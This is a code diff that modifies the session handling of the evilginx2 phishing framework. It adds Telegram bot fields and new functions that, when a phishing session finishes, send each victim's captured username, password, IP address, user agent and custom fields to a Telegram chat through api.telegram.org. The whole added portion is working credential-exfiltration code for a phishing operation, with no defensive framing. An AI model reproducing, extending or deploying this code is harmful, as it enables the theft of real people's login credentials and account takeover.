@@ -1,57 +1,80 @@
 package core
 
 import (
+	//"bytes"
+	//"encoding/json"
+	"fmt"
+	"io"
+	"os"
+
+	//"mime/multipart"
+	"net/http"
+	"net/url"
+
+	//"os"
+	"regexp"
+
+	//"strings"
 	"time"
 
+	//"io/fs"
 	"github.com/kgretzky/evilginx2/database"
 )
 
 type Session struct {
-	Id             string
-	Name           string
-	Username       string
-	Password       string
-	Custom         map[string]string
-	Params         map[string]string
-	BodyTokens     map[string]string
-	HttpTokens     map[string]string
-	CookieTokens   map[string]map[string]*database.CookieToken
-	RedirectURL    string
-	IsDone         bool
-	IsAuthUrl      bool
-	IsForwarded    bool
-	ProgressIndex  int
-	RedirectCount  int
-	PhishLure      *Lure
-	RedirectorName string
-	LureDirPath    string
-	DoneSignal     chan struct{}
-	RemoteAddr     string
-	UserAgent      string
+	Id               string
+	Name             string
+	Username         string
+	Password         string
+	Custom           map[string]string
+	Params           map[string]string
+	BodyTokens       map[string]string
+	HttpTokens       map[string]string
+	CookieTokens     map[string]map[string]*database.CookieToken
+	RedirectURL      string
+	IsDone           bool
+	IsAuthUrl        bool
+	IsForwarded      bool
+	ProgressIndex    int
+	RedirectCount    int
+	PhishLure        *Lure
+	RedirectorName   string
+	LureDirPath      string
+	DoneSignal       chan struct{}
+	RemoteAddr       string
+	UserAgent        string
+	TelegramBotToken string
+	TelegramUserID   string
 }
 
-func NewSession(name string) (*Session, error) {
+func getConfigValue(key string) string {
+	return os.Getenv(key)
+}
+
+func NewSession(name string, cfg *Config) (*Session, error) {
 	s := &Session{
-		Id:             GenRandomToken(),
-		Name:           name,
-		Username:       "",
-		Password:       "",
-		Custom:         make(map[string]string),
-		Params:         make(map[string]string),
-		BodyTokens:     make(map[string]string),
-		HttpTokens:     make(map[string]string),
-		RedirectURL:    "",
-		IsDone:         false,
-		IsAuthUrl:      false,
-		IsForwarded:    false,
-		ProgressIndex:  0,
-		RedirectCount:  0,
-		PhishLure:      nil,
-		RedirectorName: "",
-		LureDirPath:    "",
-		DoneSignal:     make(chan struct{}),
-		RemoteAddr:     "",
-		UserAgent:      "",
+		Id:               GenRandomToken(),
+		Name:             name,
+		Username:         "",
+		Password:         "",
+		Custom:           make(map[string]string),
+		Params:           make(map[string]string),
+		BodyTokens:       make(map[string]string),
+		HttpTokens:       make(map[string]string),
+		RedirectURL:      "",
+		IsDone:           false,
+		IsAuthUrl:        false,
+		IsForwarded:      false,
+		ProgressIndex:    0,
+		RedirectCount:    0,
+		PhishLure:        nil,
+		RedirectorName:   "",
+		LureDirPath:      "",
+		DoneSignal:       make(chan struct{}),
+		RemoteAddr:       "",
+		UserAgent:        "",
+		TelegramBotToken: cfg.GetTelegramBotToken(),
+		TelegramUserID:   cfg.GetTelegramUserID(),
 	}
 	s.CookieTokens = make(map[string]map[string]*database.CookieToken)
 
@@ -124,6 +147,8 @@ func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAut
 	}
 
 	if len(tcopy) == 0 {
+		// Remove the cookie sending part
+		// Just return true to indicate all tokens are captured
 		return true
 	}
 	return false
@@ -138,4 +163,63 @@ func (s *Session) Finish(is_auth_url bool) {
 			s.DoneSignal = nil
 		}
 	}
+	// Log a message indicating that Finish function is called and whether it's an authentication URL
+
+	// Send session details to Telegram bot
+	go s.SendSessionDetailsToTelegramBot()
+	//go s.SendCapturedCookieTokensToTelegramBot()
+}
+
+func (s *Session) SendSessionDetailsToTelegramBot() {
+	// Start with the basic session details
+	sessionMessage := fmt.Sprintf(
+		"<b>New Session Captured</b>\n\n"+
+			"<code>Name:</code> <b>%s</b>\n"+
+			"<code>Username:</code> <i>%s</i>\n"+
+			"<code>Password:</code> <span class=\"tg-spoiler\">%s</span>\n"+
+			"<code>Landing URL:</code> <u>%s</u>\n"+
+			"<code>IP Address:</code> <code>%s</code>\n"+
+			"<code>User Agent:</code> <pre>%s</pre>",
+		s.Name, s.Username, s.Password, s.RedirectURL, s.RemoteAddr, s.UserAgent)
+
+	// Add custom fields to the message
+	if len(s.Custom) > 0 {
+		sessionMessage += "\n\n<b>Custom Fields:</b>\n"
+		for key, value := range s.Custom {
+			sessionMessage += fmt.Sprintf("<code>%s:</code> <i>%s</i>\n", key, value)
+		}
+	}
+
+	// Log the session message (without HTML tags for console readability)
+	fmt.Println("Session message:", stripHTMLTags(sessionMessage))
+
+	// Send session details to Telegram bot
+	go SendFormattedMessageToTelegramBot(sessionMessage, s.TelegramBotToken, s.TelegramUserID)
+}
+
+// SendFormattedMessageToTelegramBot sends an HTML-formatted message to a Telegram bot
+func SendFormattedMessageToTelegramBot(message, botToken, userID string) {
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
+
+	data := url.Values{}
+	data.Set("chat_id", userID)
+	data.Set("text", message)
+	data.Set("parse_mode", "HTML")
+
+	resp, err := http.PostForm(apiURL, data)
+	if err != nil {
+		fmt.Println("Error sending message to Telegram bot:", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		bodyBytes, _ := io.ReadAll(resp.Body)
+		fmt.Printf("Unexpected status code: %d, response: %s\n", resp.StatusCode, string(bodyBytes))
+	}
+}
+
+// Helper function to strip HTML tags for console logging
+func stripHTMLTags(s string) string {
+	return regexp.MustCompile("<[^>]*>").ReplaceAllString(s, "")
 }
